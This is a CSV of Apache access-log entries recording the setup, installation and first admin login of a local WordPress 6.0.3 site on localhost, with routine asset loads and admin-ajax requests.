timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
19/Oct/2022:12:20:28,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,537,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:37,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:21:28,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:22:29,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:24:30,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:26:31,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:28:32,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:30:33,172.17.0.1,POST,/wp-admin/admin-ajax.php,"""http://localhost:8080/wp-admin/""",200,486,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:06,172.17.0.1,GET,/wp-login.php,"""http://localhost:8080/wp-admin/install.php?step=2""",200,2227,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:06,172.17.0.1,GET,/wp-admin/css/login.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php""",200,2494,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:21,172.17.0.1,POST,/wp-login.php,"""http://localhost:8080/wp-login.php""",302,1123,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:21,172.17.0.1,GET,/wp-admin/,"""http://localhost:8080/wp-login.php""",200,18043,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/thickbox/thickbox.css?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1275,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,"/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=hoverIntent,regenerator-runtime,wp-polyfill,wp-hooks&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,11674,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,"/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,35286,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/common.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,6869,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/css/editor.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,6229,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/hoverintent-js.min.js?ver=2.2.1,"""http://localhost:8080/wp-admin/""",200,1060,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/admin-bar.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1738,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/dom-ready.min.js?ver=d996b53411d1533a84951212ab6ac4ff,"""http://localhost:8080/wp-admin/""",200,673,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/a11y.min.js?ver=a38319d7ba46c6e60f7f9d4c371222c5,"""http://localhost:8080/wp-admin/""",200,1331,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/clipboard.min.js?ver=2.0.10,"""http://localhost:8080/wp-admin/""",200,3446,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,"/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,100689,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/api-request.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,932,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/url.min.js?ver=16385e4d69da65c7283790971de6b297,"""http://localhost:8080/wp-admin/""",200,2337,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/site-health.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2484,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/vendor/lodash.min.js?ver=4.17.19,"""http://localhost:8080/wp-admin/""",200,25273,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/install.min.css?ver=6.0.3""",200,1810,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:53,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:04:54,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:04:55,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/setup-config.php?step=1,"""http://localhost:8080/wp-admin/setup-config.php""",200,1453,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/install.min.css?ver=6.0.3""",304,248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:48,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:19:04,172.17.0.1,POST,/wp-admin/setup-config.php?step=2,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1028,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/install.min.css?ver=6.0.3""",304,248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:07,172.17.0.1,GET,/wp-admin/install.php?language=en_US,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,2666,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/zxcvbn-async.min.js?ver=1.0,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,598,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2801,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/hooks.min.js?ver=c6d64f2cb8f5c6bb49caca37f8828ce3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2005,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,7439,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/i18n.min.js?ver=ebee46757c6a411e38fd079a7ac71d94,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,4209,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-admin/js/password-strength-meter.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,963,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/wp-util.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,1047,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-admin/js/user-profile.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2669,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/underscore.min.js?ver=1.13.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,7657,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/zxcvbn.min.js,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,400393,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:17,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:20:02,172.17.0.1,POST,/wp-admin/install.php?step=2,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,1633,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/,"""-""",302,265,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/setup-config.php,"""-""",200,1386,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:19,172.17.0.1,GET,/,"""-""",200,3459,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:15,172.17.0.1,GET,/,"""-""",200,3460,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
